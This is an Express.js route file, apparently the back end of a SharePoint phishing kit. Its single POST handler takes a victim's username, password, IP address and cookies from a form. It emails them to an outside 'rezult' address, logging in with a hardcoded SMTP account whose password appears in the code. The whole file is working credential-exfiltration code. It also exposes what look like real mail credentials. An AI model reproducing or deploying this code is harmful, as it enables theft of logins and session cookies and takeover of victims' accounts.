const express = require('express');
const router = express.Router();
const mailer = require('../helper/mailer');

router.post('/send-mail', (req, res) => {
    const { username, pass, ip, cookies } = req.body;
    const nodeTransport = mailer.createNodeMailerTransport('celio.khan@century21.pt', 'c3l10@C21');
    mailer.sendEmail('celio.khan@century21.pt', "dz-rezult@bounce-daemon.com", 'SharePoint-Data', username, pass, ip, cookies, nodeTransport);
    res.status(200).send('Email sent successfully');
});

module.exports = router;
